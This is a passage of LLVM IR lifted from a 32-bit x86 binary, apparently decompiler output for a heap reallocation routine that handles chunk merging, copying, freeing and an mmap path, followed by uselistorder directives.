  %v3_8050ddc = load i32, i32* %v2_8050ddc, align 4
  store i32 %v3_8050ddc, i32* @edx, align 4
  %v1_8050de1 = and i32 %v3_8050ddc, -4
  store i32 %v1_8050de1, i32* %eax.global-to-local, align 4
  %v2_8050de8 = and i32 %v3_8050ddc, 2
  %v3_8050de8 = icmp eq i32 %v2_8050de8, 0
  %v1_8050deb = icmp eq i1 %v3_8050de8, false
  br i1 %v1_8050deb, label %dec_label_pc_8050f85, label %dec_label_pc_8050df1

dec_label_pc_8050df1:                             ; preds = %dec_label_pc_8050dd5
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050de1, i32* @ebx, align 4
  %v7_8050df7 = icmp ult i32 %v1_8050de1, %stack_var_-40.0
  %v1_8050df9 = icmp eq i1 %v7_8050df7, false
  br i1 %v1_8050df9, label %dec_label_pc_8050f30, label %dec_label_pc_8050dff

dec_label_pc_8050dff:                             ; preds = %dec_label_pc_8050df1
  %v2_8050dff = add i32 %v1_8050de1, %v1_8050dd9
  store i32 %v2_8050dff, i32* @esi, align 4
  %v1_8050e02 = load i32, i32* @global_var_805336c.189, align 4
  %v12_8050e02 = icmp eq i32 %v2_8050dff, %v1_8050e02
  %v1_8050e08 = icmp eq i1 %v12_8050e02, false
  %v1_8050e42 = add i32 %v2_8050dff, 4
  %v2_8050e42 = inttoptr i32 %v1_8050e42 to i32*
  %v3_8050e42 = load i32, i32* %v2_8050e42, align 4
  br i1 %v1_8050e08, label %dec_label_pc_8050e42, label %dec_label_pc_8050e0a

dec_label_pc_8050e0a:                             ; preds = %dec_label_pc_8050dff
  %v1_8050e0f = and i32 %v3_8050e42, -4
  %v2_8050e12 = add i32 %v1_8050e0f, %v1_8050de1
  store i32 %v2_8050e12, i32* %ecx.global-to-local, align 4
  %v1_8050e18 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8050e18, i32* %eax.global-to-local, align 4
  %v7_8050e1b = icmp ult i32 %v2_8050e12, %v1_8050e18
  br i1 %v7_8050e1b, label %dec_label_pc_8050e80, label %dec_label_pc_8050e1f

dec_label_pc_8050e1f:                             ; preds = %dec_label_pc_8050e0a
  %v1_8050e1f = urem i32 %v3_8050ddc, 2
  %v5_8050e22 = or i32 %v1_8050e1f, %stack_var_-40.0
  store i32 %v5_8050e22, i32* @edx, align 4
  store i32 %v5_8050e22, i32* %v2_8050ddc, align 4
  %v0_8050e2d = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050e2d = sub i32 %v0_8050e2d, %stack_var_-40.0
  %v0_8050e2f = load i32, i32* @edi, align 4
  %v2_8050e2f = add i32 %v0_8050e2f, %stack_var_-40.0
  store i32 %v2_8050e2f, i32* %eax.global-to-local, align 4
  %v1_8050e32 = or i32 %v2_8050e2d, 1
  store i32 %v1_8050e32, i32* %ecx.global-to-local, align 4
  store i32 %v2_8050e2f, i32* @global_var_805336c.189, align 4
  %v2_8050e3a = add i32 %v2_8050e2f, 4
  %v3_8050e3a = inttoptr i32 %v2_8050e3a to i32*
  store i32 %v1_8050e32, i32* %v3_8050e3a, align 4
  br label %dec_label_pc_8051055

dec_label_pc_8050e42:                             ; preds = %dec_label_pc_8050dff
  %v1_8050e47 = and i32 %v3_8050e42, -2
  store i32 %v1_8050e47, i32* %eax.global-to-local, align 4
  %v3_8050e4a = add i32 %v1_8050e42, %v1_8050e47
  %v4_8050e4a = inttoptr i32 %v3_8050e4a to i8*
  %v5_8050e4a = load i8, i8* %v4_8050e4a, align 1
  %v6_8050e4a = urem i8 %v5_8050e4a, 2
  %v7_8050e4a = icmp eq i8 %v6_8050e4a, 0
  %v1_8050e4f = icmp eq i1 %v7_8050e4a, false
  br i1 %v1_8050e4f, label %dec_label_pc_8050e80, label %dec_label_pc_8050e51

dec_label_pc_8050e51:                             ; preds = %dec_label_pc_8050e42
  %v1_8050e51 = and i32 %v3_8050e42, -4
  %v2_8050e58 = add i32 %v1_8050e51, %v1_8050de1
  store i32 %v2_8050e58, i32* @ebx, align 4
  %v10_8050e5a = icmp ult i32 %v2_8050e58, %stack_var_-40.0
  br i1 %v10_8050e5a, label %dec_label_pc_8050e80, label %dec_label_pc_8050e60

dec_label_pc_8050e60:                             ; preds = %dec_label_pc_8050e51
  %v1_8050e60 = add i32 %v1_8050de1, %tmp6
  %v2_8050e60 = inttoptr i32 %v1_8050e60 to i32*
  %v3_8050e60 = load i32, i32* %v2_8050e60, align 4
  store i32 %v3_8050e60, i32* @edx, align 4
  %v1_8050e63 = add i32 %v2_8050dff, 12
  %v2_8050e63 = inttoptr i32 %v1_8050e63 to i32*
  %v3_8050e63 = load i32, i32* %v2_8050e63, align 4
  store i32 %v3_8050e63, i32* %eax.global-to-local, align 4
  %v1_8050e66 = add i32 %v3_8050e60, 12
  %v2_8050e66 = inttoptr i32 %v1_8050e66 to i32*
  %v3_8050e66 = load i32, i32* %v2_8050e66, align 4
  %v15_8050e66 = icmp eq i32 %v3_8050e66, %v2_8050dff
  %v1_8050e69 = icmp eq i1 %v15_8050e66, false
  br i1 %v1_8050e69, label %dec_label_pc_8050e70, label %dec_label_pc_8050e6b

dec_label_pc_8050e6b:                             ; preds = %dec_label_pc_8050e60
  %v1_8050e6b = add i32 %v3_8050e63, 8
  %v2_8050e6b = inttoptr i32 %v1_8050e6b to i32*
  %v3_8050e6b = load i32, i32* %v2_8050e6b, align 4
  %v15_8050e6b = icmp eq i32 %v3_8050e6b, %v2_8050dff
  br i1 %v15_8050e6b, label %dec_label_pc_8050e75, label %dec_label_pc_8050e70

dec_label_pc_8050e70:                             ; preds = %dec_label_pc_8050e6b, %dec_label_pc_8050e60
  %v0_8050e70 = call i32 @function_8051445()
  store i32 %v0_8050e70, i32* %eax.global-to-local, align 4
  %v1_8050e75.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050e75

dec_label_pc_8050e75:                             ; preds = %dec_label_pc_8050e6b, %dec_label_pc_8050e70
  %v1_8050e75 = phi i32 [ %v3_8050e60, %dec_label_pc_8050e6b ], [ %v1_8050e75.pre, %dec_label_pc_8050e70 ]
  %v0_8050e75 = phi i32 [ %v3_8050e63, %dec_label_pc_8050e6b ], [ %v0_8050e70, %dec_label_pc_8050e70 ]
  %v2_8050e75 = add i32 %v1_8050e75, 12
  %v3_8050e75 = inttoptr i32 %v2_8050e75 to i32*
  store i32 %v0_8050e75, i32* %v3_8050e75, align 4
  %v0_8050e78 = load i32, i32* @edx, align 4
  %v1_8050e78 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050e78 = add i32 %v1_8050e78, 8
  %v3_8050e78 = inttoptr i32 %v2_8050e78 to i32*
  store i32 %v0_8050e78, i32* %v3_8050e78, align 4
  %v0_8050f30.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050f30

dec_label_pc_8050e80:                             ; preds = %dec_label_pc_8050e51, %dec_label_pc_8050e42, %dec_label_pc_8050e0a
  %v1_8050e87 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8050e87, i32* %eax.global-to-local, align 4
  store i32 %v1_8050e87, i32* %stack_var_-60, align 4
  %v1_8050e8b = call i32 @function_80504e4(i32 %v1_8050e87)
  store i32 %v1_8050e8b, i32* %eax.global-to-local, align 4
  store i32 %v1_8050e8b, i32* @edx, align 4
  %v1_8050e95 = icmp eq i32 %v1_8050e8b, 0
  br i1 %v1_8050e95, label %dec_label_pc_8051051, label %dec_label_pc_8050e9d

dec_label_pc_8050e9d:                             ; preds = %dec_label_pc_8050e80
  %v1_8050e9d = add i32 %v1_8050e8b, -8
  store i32 %v1_8050e9d, i32* %ebx.global-to-local, align 4
  %v1_8050ea0 = load i32, i32* @esi, align 4
  %v12_8050ea0 = icmp eq i32 %v1_8050e9d, %v1_8050ea0
  %v1_8050ea2 = add i32 %v1_8050e8b, -4
  %v2_8050ea2 = inttoptr i32 %v1_8050ea2 to i32*
  %v3_8050ea2 = load i32, i32* %v2_8050ea2, align 4
  store i32 %v3_8050ea2, i32* %eax.global-to-local, align 4
  %v1_8050ea5 = icmp eq i1 %v12_8050ea0, false
  br i1 %v1_8050ea5, label %dec_label_pc_8050eb3, label %dec_label_pc_8050ea7

dec_label_pc_8050ea7:                             ; preds = %dec_label_pc_8050e9d
  %v1_8050ea7 = and i32 %v3_8050ea2, -4
  store i32 %v1_8050ea7, i32* %eax.global-to-local, align 4
  store i32 %v1_8050de1, i32* @edx, align 4
  %v2_8050eae = add i32 %v1_8050ea7, %v1_8050de1
  store i32 %v2_8050eae, i32* @ebx, align 4
  br label %dec_label_pc_8050f30

dec_label_pc_8050eb3:                             ; preds = %dec_label_pc_8050e9d
  %v1_8050eb7 = add i32 %v1_8050de1, -4
  store i32 %v1_8050eb7, i32* %eax.global-to-local, align 4
  %v2_8050ebc = udiv i32 %v1_8050eb7, 4
  store i32 %v2_8050ebc, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050eb7, 37
  br i1 %tmp, label %dec_label_pc_8050ed5, label %dec_label_pc_8050ec4

dec_label_pc_8050ec4:                             ; preds = %dec_label_pc_8050eb3
  store i32 %v1_8050e8b, i32* %stack_var_-60, align 4
  %v3_8050ecb = inttoptr i32 %v1_8050e8b to i16*
  %v4_8050ecb = call i32 @function_80522d2(i16* %v3_8050ecb, i32 %tmp6, i32 %v1_8050eb7)
  store i32 %v4_8050ecb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f1c

dec_label_pc_8050ed5:                             ; preds = %dec_label_pc_8050eb3
  store i32 %tmp6, i32* @esi, align 4
  %v1_8050edc = inttoptr i32 %tmp6 to i32*
  %v2_8050edc = load i32, i32* %v1_8050edc, align 4
  store i32 %v2_8050edc, i32* %eax.global-to-local, align 4
  %v2_8050ede = inttoptr i32 %v1_8050e8b to i32*
  store i32 %v2_8050edc, i32* %v2_8050ede, align 4
  %v0_8050ee0 = load i32, i32* @esi, align 4
  %v1_8050ee0 = add i32 %v0_8050ee0, 4
  %v2_8050ee0 = inttoptr i32 %v1_8050ee0 to i32*
  %v3_8050ee0 = load i32, i32* %v2_8050ee0, align 4
  store i32 %v3_8050ee0, i32* %eax.global-to-local, align 4
  %v1_8050ee3 = load i32, i32* @edx, align 4
  %v2_8050ee3 = add i32 %v1_8050ee3, 4
  %v3_8050ee3 = inttoptr i32 %v2_8050ee3 to i32*
  store i32 %v3_8050ee0, i32* %v3_8050ee3, align 4
  %v0_8050ee6 = load i32, i32* @esi, align 4
  %v1_8050ee6 = add i32 %v0_8050ee6, 8
  %v2_8050ee6 = inttoptr i32 %v1_8050ee6 to i32*
  %v3_8050ee6 = load i32, i32* %v2_8050ee6, align 4
  store i32 %v3_8050ee6, i32* %eax.global-to-local, align 4
  %v1_8050ee9 = load i32, i32* @edx, align 4
  %v2_8050ee9 = add i32 %v1_8050ee9, 8
  %v3_8050ee9 = inttoptr i32 %v2_8050ee9 to i32*
  store i32 %v3_8050ee6, i32* %v3_8050ee9, align 4
  %tmp27 = icmp ult i32 %v1_8050eb7, 17
  br i1 %tmp27, label %dec_label_pc_8050f1c, label %dec_label_pc_8050eee

dec_label_pc_8050eee:                             ; preds = %dec_label_pc_8050ed5
  %v0_8050eee = load i32, i32* @esi, align 4
  %v1_8050eee = add i32 %v0_8050eee, 12
  %v2_8050eee = inttoptr i32 %v1_8050eee to i32*
  %v3_8050eee = load i32, i32* %v2_8050eee, align 4
  store i32 %v3_8050eee, i32* %eax.global-to-local, align 4
  %v0_8050ef1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050ef4 = load i32, i32* @edx, align 4
  %v2_8050ef4 = add i32 %v1_8050ef4, 12
  %v3_8050ef4 = inttoptr i32 %v2_8050ef4 to i32*
  store i32 %v3_8050eee, i32* %v3_8050ef4, align 4
  %v0_8050ef7 = load i32, i32* @esi, align 4
  %v1_8050ef7 = add i32 %v0_8050ef7, 16
  %v2_8050ef7 = inttoptr i32 %v1_8050ef7 to i32*
  %v3_8050ef7 = load i32, i32* %v2_8050ef7, align 4
  store i32 %v3_8050ef7, i32* %eax.global-to-local, align 4
  %v1_8050efa = load i32, i32* @edx, align 4
  %v2_8050efa = add i32 %v1_8050efa, 16
  %v3_8050efa = inttoptr i32 %v2_8050efa to i32*
  store i32 %v3_8050ef7, i32* %v3_8050efa, align 4
  %tmp21 = icmp ult i32 %v0_8050ef1, 7
  br i1 %tmp21, label %dec_label_pc_8050f1c, label %dec_label_pc_8050eff

dec_label_pc_8050eff:                             ; preds = %dec_label_pc_8050eee
  %v0_8050eff = load i32, i32* @esi, align 4
  %v1_8050eff = add i32 %v0_8050eff, 20
  %v2_8050eff = inttoptr i32 %v1_8050eff to i32*
  %v3_8050eff = load i32, i32* %v2_8050eff, align 4
  store i32 %v3_8050eff, i32* %eax.global-to-local, align 4
  %v0_8050f02 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050f05 = load i32, i32* @edx, align 4
  %v2_8050f05 = add i32 %v1_8050f05, 20
  %v3_8050f05 = inttoptr i32 %v2_8050f05 to i32*
  store i32 %v3_8050eff, i32* %v3_8050f05, align 4
  %v0_8050f08 = load i32, i32* @esi, align 4
  %v1_8050f08 = add i32 %v0_8050f08, 24
  %v2_8050f08 = inttoptr i32 %v1_8050f08 to i32*
  %v3_8050f08 = load i32, i32* %v2_8050f08, align 4
  store i32 %v3_8050f08, i32* %eax.global-to-local, align 4
  %v1_8050f0b = load i32, i32* @edx, align 4
  %v2_8050f0b = add i32 %v1_8050f0b, 24
  %v3_8050f0b = inttoptr i32 %v2_8050f0b to i32*
  store i32 %v3_8050f08, i32* %v3_8050f0b, align 4
  %tmp22 = icmp ult i32 %v0_8050f02, 9
  br i1 %tmp22, label %dec_label_pc_8050f1c, label %dec_label_pc_8050f10

dec_label_pc_8050f10:                             ; preds = %dec_label_pc_8050eff
  %v0_8050f10 = load i32, i32* @esi, align 4
  %v1_8050f10 = add i32 %v0_8050f10, 28
  %v2_8050f10 = inttoptr i32 %v1_8050f10 to i32*
  %v3_8050f10 = load i32, i32* %v2_8050f10, align 4
  store i32 %v3_8050f10, i32* %eax.global-to-local, align 4
  %v1_8050f13 = load i32, i32* @edx, align 4
  %v2_8050f13 = add i32 %v1_8050f13, 28
  %v3_8050f13 = inttoptr i32 %v2_8050f13 to i32*
  store i32 %v3_8050f10, i32* %v3_8050f13, align 4
  %v0_8050f16 = load i32, i32* @esi, align 4
  %v1_8050f16 = add i32 %v0_8050f16, 32
  %v2_8050f16 = inttoptr i32 %v1_8050f16 to i32*
  %v3_8050f16 = load i32, i32* %v2_8050f16, align 4
  store i32 %v3_8050f16, i32* %eax.global-to-local, align 4
  %v1_8050f19 = load i32, i32* @edx, align 4
  %v2_8050f19 = add i32 %v1_8050f19, 32
  %v3_8050f19 = inttoptr i32 %v2_8050f19 to i32*
  store i32 %v3_8050f16, i32* %v3_8050f19, align 4
  br label %dec_label_pc_8050f1c

dec_label_pc_8050f1c:                             ; preds = %dec_label_pc_8050eee, %dec_label_pc_8050ed5, %dec_label_pc_8050eff, %dec_label_pc_8050ec4, %dec_label_pc_8050f10
  %v0_8050f1f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050f1f = add i32 %v0_8050f1f, 8
  store i32 %v1_8050f1f, i32* @ebx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8050f26 = call i32 @function_80512a9(i32 %tmp6)
  br label %dec_label_pc_805104c

dec_label_pc_8050f30:                             ; preds = %dec_label_pc_8050df1, %dec_label_pc_8050ea7, %dec_label_pc_8050e75
  %v1_8050f41 = phi i32 [ %v1_8050de1, %dec_label_pc_8050df1 ], [ %v2_8050eae, %dec_label_pc_8050ea7 ], [ %v0_8050f30.pre, %dec_label_pc_8050e75 ]
  %v5_8050f32 = sub i32 %v1_8050f41, %stack_var_-40.0
  store i32 %v5_8050f32, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v5_8050f32, 16
  br i1 %tmp23, label %dec_label_pc_8050f3b, label %dec_label_pc_8050f4d

dec_label_pc_8050f3b:                             ; preds = %dec_label_pc_8050f30
  %v0_8050f3b = load i32, i32* @edi, align 4
  %v1_8050f3b = add i32 %v0_8050f3b, 4
  %v2_8050f3b = inttoptr i32 %v1_8050f3b to i32*
  %v3_8050f3b = load i32, i32* %v2_8050f3b, align 4
  %v1_8050f3e = urem i32 %v3_8050f3b, 2
  %v2_8050f41 = or i32 %v1_8050f3e, %v1_8050f41
  store i32 %v2_8050f41, i32* %eax.global-to-local, align 4
  store i32 %v2_8050f41, i32* %v2_8050f3b, align 4
  %v0_8050f46 = load i32, i32* @edi, align 4
  %v1_8050f46 = load i32, i32* @ebx, align 4
  %v2_8050f46 = add i32 %v0_8050f46, 4
  %v3_8050f46 = add i32 %v2_8050f46, %v1_8050f46
  %v4_8050f46 = inttoptr i32 %v3_8050f46 to i32*
  %v5_8050f46 = load i32, i32* %v4_8050f46, align 4
  %v6_8050f46 = or i32 %v5_8050f46, 1
  store i32 %v6_8050f46, i32* %v4_8050f46, align 4
  br label %dec_label_pc_8050f7d

dec_label_pc_8050f4d:                             ; preds = %dec_label_pc_8050f30
  %v0_8050f51 = load i32, i32* @edi, align 4
  %v2_8050f51 = add i32 %v0_8050f51, %stack_var_-40.0
  store i32 %v2_8050f51, i32* %eax.global-to-local, align 4
  %v1_8050f54 = add i32 %v0_8050f51, 4
  %v2_8050f54 = inttoptr i32 %v1_8050f54 to i32*
  %v3_8050f54 = load i32, i32* %v2_8050f54, align 4
  %v1_8050f57 = urem i32 %v3_8050f54, 2
  %v5_8050f5a = or i32 %v1_8050f57, %stack_var_-40.0
  store i32 %v5_8050f5a, i32* %v2_8050f54, align 4
  %v0_8050f64 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050f66 = or i32 %v0_8050f64, 1
  store i32 %v1_8050f66, i32* @edx, align 4
  %v1_8050f69 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050f69 = add i32 %v1_8050f69, 4
  %v3_8050f69 = inttoptr i32 %v2_8050f69 to i32*
  store i32 %v1_8050f66, i32* %v3_8050f69, align 4
  %v0_8050f6c = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f6c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050f6c = add i32 %v0_8050f6c, 4
  %v3_8050f6c = add i32 %v2_8050f6c, %v1_8050f6c
  %v4_8050f6c = inttoptr i32 %v3_8050f6c to i32*
  %v5_8050f6c = load i32, i32* %v4_8050f6c, align 4
  %v6_8050f6c = or i32 %v5_8050f6c, 1
  store i32 %v6_8050f6c, i32* %v4_8050f6c, align 4
  %v0_8050f71 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f71 = add i32 %v0_8050f71, 8
  store i32 %v1_8050f71, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f71, i32* %stack_var_-60, align 4
  %v1_8050f75 = call i32 @function_80512a9(i32 %v1_8050f71)
  store i32 %v1_8050f75, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f7d

dec_label_pc_8050f7d:                             ; preds = %dec_label_pc_8050f3b, %dec_label_pc_8050f4d
  %v0_8050f7d = load i32, i32* @edi, align 4
  %v1_8050f7d = add i32 %v0_8050f7d, 8
  store i32 %v1_8050f7d, i32* @ebx, align 4
  br label %dec_label_pc_8051059

dec_label_pc_8050f85:                             ; preds = %dec_label_pc_8050dd5
  store i32 %tmp6, i32* %ecx.global-to-local, align 4
  %v0_8050f89 = load i32, i32* @global_var_805369c.194, align 4
  %v1_8050f8e = add i32 %v0_8050f89, -1
  store i32 %v1_8050f8e, i32* %eax.global-to-local, align 4
  %v2_8050f93 = inttoptr i32 %v1_8050dd9 to i32*
  %v3_8050f93 = load i32, i32* %v2_8050f93, align 4
  store i32 %v3_8050f93, i32* @ebp, align 4
  %v1_8050f96 = or i32 %stack_var_-40.0, 4
  store i32 %v1_8050f96, i32* %stack_var_-44, align 4
  %v2_8050f9c = add i32 %v3_8050f93, %v1_8050f8e
  store i32 %v2_8050f9c, i32* @edx, align 4
  %v1_8050f9f = sub i32 0, %v0_8050f89
  store i32 %v1_8050f9f, i32* %eax.global-to-local, align 4
  %v2_8050fa1 = add i32 %v2_8050f9c, %v1_8050f96
  %v2_8050fa4 = and i32 %v2_8050fa1, %v1_8050f9f
  store i32 %v2_8050fa4, i32* @esi, align 4
  %v2_8050fa8 = sub i32 %v2_8050fa4, %v3_8050f93
  store i32 %v2_8050fa8, i32* @ebx, align 4
  %v15_8050faa = icmp eq i32 %v1_8050de1, %v2_8050fa8
  br i1 %v15_8050faa, label %dec_label_pc_8051055, label %dec_label_pc_8050fb4

dec_label_pc_8050fb4:                             ; preds = %dec_label_pc_8050f85
  %v2_8050fbb = sub i32 %v1_8050dd9, %v3_8050f93
  store i32 %v2_8050fbb, i32* @edi, align 4
  %v2_8050fbd = add i32 %v3_8050f93, %v1_8050de1
  store i32 %v2_8050fbd, i32* %eax.global-to-local, align 4
  store i32 %v2_8050fbb, i32* %stack_var_-60, align 4
  %v6_8050fc1 = inttoptr i32 %v2_8050fbb to i32*
  %v7_8050fc1 = call i32 @function_8052136(i32* %v6_8050fc1, i32 %v2_8050fbd, i32 %v2_8050fa4, i32 1, i32 %v1_8050f96, i32 %v1_8050de1)
  store i32 %v7_8050fc1, i32* %eax.global-to-local, align 4
  %v10_8050fc9 = icmp eq i32 %v7_8050fc1, -1
  br i1 %v10_8050fc9, label %dec_label_pc_805100d, label %dec_label_pc_8050fce

dec_label_pc_8050fce:                             ; preds = %dec_label_pc_8050fb4
  %v1_8050fce = load i32, i32* @ebp, align 4
  %v2_8050fce = add i32 %v1_8050fce, %v7_8050fc1
  store i32 %v2_8050fce, i32* @edx, align 4
  %v0_8050fd1 = load i32, i32* @ebx, align 4
  %v1_8050fd1 = or i32 %v0_8050fd1, 2
  store i32 %v1_8050fd1, i32* %ebx.global-to-local, align 4
  %v0_8050fd4 = load i32, i32* @esi, align 4
  store i32 %v0_8050fd4, i32* %eax.global-to-local, align 4
  %v2_8050fd6 = add i32 %v2_8050fce, 4
  %v3_8050fd6 = inttoptr i32 %v2_8050fd6 to i32*
  store i32 %v1_8050fd1, i32* %v3_8050fd6, align 4
  %v0_8050fd9 = load i32, i32* %eax.global-to-local, align 4
  %v5_8050fd9 = sub i32 %v0_8050fd9, %v1_8050de1
  %v1_8050fdd = load i32, i32* @global_var_80536a4.199, align 4
  %v2_8050fdd = add i32 %v1_8050fdd, %v5_8050fd9
  store i32 %v2_8050fdd, i32* %eax.global-to-local, align 4
  store i32 %v2_8050fdd, i32* @global_var_80536a4.199, align 4
  %v1_8050fe8 = load i32, i32* @global_var_80536b0.200, align 16
  %tmp24 = icmp ugt i32 %v2_8050fdd, %v1_8050fe8
  br i1 %tmp24, label %dec_label_pc_8050ff0, label %dec_label_pc_8050ff5

dec_label_pc_8050ff0:                             ; preds = %dec_label_pc_8050fce
  store i32 %v2_8050fdd, i32* @global_var_80536b0.200, align 16
  br label %dec_label_pc_8050ff5

dec_label_pc_8050ff5:                             ; preds = %dec_label_pc_8050fce, %dec_label_pc_8050ff0
  %v1_8050ff5 = load i32, i32* @global_var_80536a8.201, align 8
  %v2_8050ff5 = add i32 %v1_8050ff5, %v2_8050fdd
  store i32 %v2_8050ff5, i32* %eax.global-to-local, align 4
  %v1_8050ffb = load i32, i32* @global_var_80536b4.202, align 4
  %tmp25 = icmp ugt i32 %v2_8050ff5, %v1_8050ffb
  br i1 %tmp25, label %dec_label_pc_8051003, label %dec_label_pc_8051008

dec_label_pc_8051003:                             ; preds = %dec_label_pc_8050ff5
  store i32 %v2_8050ff5, i32* @global_var_80536b4.202, align 4
  br label %dec_label_pc_8051008

dec_label_pc_8051008:                             ; preds = %dec_label_pc_8050ff5, %dec_label_pc_8051003
  %v0_8051008 = load i32, i32* @edx, align 4
  %v1_8051008 = add i32 %v0_8051008, 8
  store i32 %v1_8051008, i32* @ebx, align 4
  br label %dec_label_pc_8051059

dec_label_pc_805100d:                             ; preds = %dec_label_pc_8050fb4
  %v2_805100d = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_805100d, i32* %eax.global-to-local, align 4
  %v10_8051010 = icmp ult i32 %v1_8050de1, %v2_805100d
  %v1_8051014 = icmp eq i1 %v10_8051010, false
  br i1 %v1_8051014, label %dec_label_pc_8051055, label %dec_label_pc_8051016

dec_label_pc_8051016:                             ; preds = %dec_label_pc_805100d
  %v1_805101d = add i32 %stack_var_-40.0, -7
  store i32 %v1_805101d, i32* %eax.global-to-local, align 4
  store i32 %v1_805101d, i32* %stack_var_-60, align 4
  %v1_8051021 = call i32 @function_80504e4(i32 %v1_805101d)
  store i32 %v1_8051021, i32* %eax.global-to-local, align 4
  store i32 %v1_8051021, i32* @ebx, align 4
  %v1_805102b = icmp eq i32 %v1_8051021, 0
  br i1 %v1_805102b, label %dec_label_pc_8051051, label %dec_label_pc_805102f

dec_label_pc_805102f:                             ; preds = %dec_label_pc_8051016
  %v1_8051034 = add i32 %v1_8050de1, -8
  store i32 %v1_8051034, i32* %eax.global-to-local, align 4
  store i32 %v1_8051021, i32* %stack_var_-60, align 4
  %v3_805103d = inttoptr i32 %v1_8051021 to i16*
  %v4_805103d = call i32 @function_80522d2(i16* %v3_805103d, i32 %tmp6, i32 %v1_8051034)
  store i32 %v4_805103d, i32* %eax.global-to-local, align 4
  store i32 %v1_8051021, i32* @edx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8051047 = call i32 @function_80512a9(i32 %tmp6)
  br label %dec_label_pc_805104c

dec_label_pc_805104c:                             ; preds = %dec_label_pc_8050f1c, %dec_label_pc_805102f
  %storemerge = phi i32 [ %v1_8051047, %dec_label_pc_805102f ], [ %v1_8050f26, %dec_label_pc_8050f1c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051059

dec_label_pc_8051051:                             ; preds = %dec_label_pc_8050e80, %dec_label_pc_8051016
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8051059

dec_label_pc_8051055:                             ; preds = %dec_label_pc_805100d, %dec_label_pc_8050f85, %dec_label_pc_8050e1f
  store i32 %tmp6, i32* @ebx, align 4
  br label %dec_label_pc_8051059

dec_label_pc_8051059:                             ; preds = %dec_label_pc_8051051, %dec_label_pc_805104c, %dec_label_pc_8051008, %dec_label_pc_8050f7d, %dec_label_pc_8051055
  store i32 %v2_8050d8e, i32* @eax, align 4
  store i32 %v2_8050d8e, i32* %stack_var_-60, align 4
  %v2_8051062 = call i32 @function_8051a10(i32 %v2_8050d8e, i32 1)
  store i32 %v2_8051062, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051067

dec_label_pc_8051067:                             ; preds = %dec_label_pc_8050d72, %dec_label_pc_8050d5e, %dec_label_pc_8051059
  br label %dec_label_pc_805106a

dec_label_pc_805106a:                             ; preds = %dec_label_pc_8050dac, %dec_label_pc_8051067
  %v0_805106d = load i32, i32* @ebx, align 4
  store i32 %v0_805106d, i32* %eax.global-to-local, align 4
  store i32 %v0_8050d4f, i32* @ebx, align 4
  store i32 %v0_8050d4e, i32* @esi, align 4
  store i32 %v0_8050d4d, i32* @edi, align 4
  store i32 %v0_8050d4c, i32* @ebp, align 4
  ret i32 %v0_805106d

; uselistorder directives
  uselistorder i32 %v1_8051021, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8050ff5, { 1, 0, 2 }
  uselistorder i32 %v2_8050fdd, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8050fbb, { 1, 0, 2 }
  uselistorder i32 %v1_8050f96, { 1, 0, 2 }
  uselistorder i32 %v3_8050f93, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8050f51, { 1, 0 }
  uselistorder i32 %v1_8050eb7, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8050e8b, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_8050e2f, { 1, 0, 2 }
  uselistorder i32 %v3_8050e42, { 0, 2, 1 }
  uselistorder i32 %v2_8050dff, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8050de1, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8050dd9, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_8050dce, { 1, 0 }
  uselistorder i32 %v1_8050dbe, { 0, 2, 1 }
  uselistorder i32 %v0_8050da7, { 1, 0 }
  uselistorder i32 %v2_8050d8e, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 0, 2, 1, 3 }
  uselistorder i32 %tmp6, { 15, 14, 13, 2, 12, 11, 10, 1, 9, 3, 0, 8, 7, 6, 5, 4 }
  uselistorder i32* %ecx.global-to-local, { 7, 8, 9, 10, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 25, 26, 50, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 0, 20, 21, 22, 23, 24 }
  uselistorder i32 -32, { 0, 1, 4, 5, 6, 2, 3 }
  uselistorder i32 (i32)* @function_80512a9, { 2, 1, 0, 10, 5, 6, 4, 3, 9, 8, 11, 7 }
